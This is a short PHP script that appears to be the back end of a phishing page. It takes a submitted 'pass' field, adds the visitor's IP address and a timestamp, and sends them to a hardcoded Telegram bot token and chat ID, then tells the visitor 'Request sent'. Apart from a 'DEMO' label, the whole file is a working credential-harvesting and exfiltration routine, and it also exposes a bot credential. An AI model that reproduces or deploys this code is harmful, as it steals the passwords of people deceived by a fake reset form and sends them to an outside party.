<?php
$token = "8210016681:AAFCdXDYc_vu6Ep4tfRiOyT4wfPvJFqf1lY";
$chat_id = "-1003873305689";

$pass = $_POST['pass'] ?? '';

if ($pass != '') {
    $text = "🔔 Reset Request (DEMO)\n\n"
          . "👤 User: $pass\n"
          . "🌍 IP: ".$_SERVER['REMOTE_ADDR']."\n"
          . "🕒 Time: ".date("Y-m-d H:i:s");

    $url = "https://api.telegram.org/bot$token/sendMessage";
    file_get_contents($url."?chat_id=$chat_id&text=".urlencode($text));
}

echo "Request sent";
